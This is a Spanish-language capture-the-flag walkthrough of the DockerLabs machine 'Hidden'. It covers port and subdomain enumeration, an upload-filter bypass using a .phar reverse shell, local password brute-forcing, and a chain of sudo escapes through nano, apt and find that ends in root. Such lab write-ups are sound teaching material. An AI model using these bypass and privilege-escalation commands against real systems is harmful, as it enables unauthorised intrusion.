## Introducción

Este documento presenta la resolución completa de la máquina **Hidden**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un subdominio `dev.hidden.lab` que contiene un formulario de subida de archivos con restricciones de extensión. Mediante el uso de la extensión `.phar`, se logra el bypass y se sube una reverse shell, obteniendo acceso como `www-data`.
Una vez dentro, se utiliza `UserRush` para obtener las credenciales de `cafetero`. Posteriormente, se encadenan configuraciones inseguras de `sudo`: `cafetero` puede ejecutar `nano` como `john`, `john` puede ejecutar `apt` como `bobby`, y `bobby` puede ejecutar `find` como root, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Hidden.zip
sudo bash auto_deploy.sh Hidden.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Hidden/{content,exploits,nmap,scripts}
cd Hidden
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/Ports_poaibe.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2
```

---

### 1.3 Enumeración web

Se identifica el dominio `hidden.lab` en la redirección. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 hidden.lab" | sudo tee -a /etc/hosts
```

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://hidden.lab -d 0 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,txt,html,js,bak,old \
  -t 40 -C 404,403
```

![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/Feroxbuster_wuovib.png)

### 1.4 Enumeración de subdominios

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u "http://hidden.lab" \
     -H "Host: FUZZ.hidden.lab" -fl 10
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/FFUF_l4waaa.png)

Se descubre `dev.hidden.lab`. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 dev.hidden.lab" | sudo tee -a /etc/hosts
```

El subdominio contiene un formulario de subida de archivos:

![Dev Form](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/DevForm_ggbshy.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Subida de reverse shell

El formulario bloquea extensiones `.php`, pero permite `.phar`. Se sube una reverse shell en `.phar`:

![Shell in uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1764969933/Uploads_hepojs.png)

Se inicia un listener:

```bash
nc -nlvp 443
```

Se accede al archivo:

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1764969930/RevShell_wwpt0l.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → cafetero

Se utiliza `UserRush` para fuerza bruta local:

```bash
./UserRush.sh -u cafetero
```

![UserRush](https://res.cloudinary.com/dewqswzke/image/upload/v1764969933/UserRush_rwklcn.png)

```bash
su cafetero
```

![Cafetero](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/Cafetero_rdouym.png)

### 3.2 De cafetero → john

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l cafetero](https://res.cloudinary.com/dewqswzke/image/upload/v1764969932/Sudo-lCafetero_v579qt.png)

Se puede ejecutar `nano` como `john`. Se obtiene una shell:

```bash
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

![John](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/John_u3rkea.png)

### 3.3 De john → bobby

Se verifican los permisos sudo de `john`:

```bash
sudo -l
```

![Sudo -l john](https://res.cloudinary.com/dewqswzke/image/upload/v1764969932/Sudo-lJohn_llmzzd.png)

Se puede ejecutar `apt` como `bobby`:

```bash
sudo apt changelog apt
!/bin/bash
```

![Bobby](https://res.cloudinary.com/dewqswzke/image/upload/v1764969928/Bobby_trmwkj.png)

### 3.4 De bobby → root

Se verifican los permisos sudo de `bobby`:

```bash
sudo -l
```

![Sudo -l bobby](https://res.cloudinary.com/dewqswzke/image/upload/v1764969931/Sudo-lBobby_qrdbes.png)

Se puede ejecutar `find` como root:

```bash
sudo find . -exec /bin/bash \; -quit
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764969929/Root_yggsnd.png)
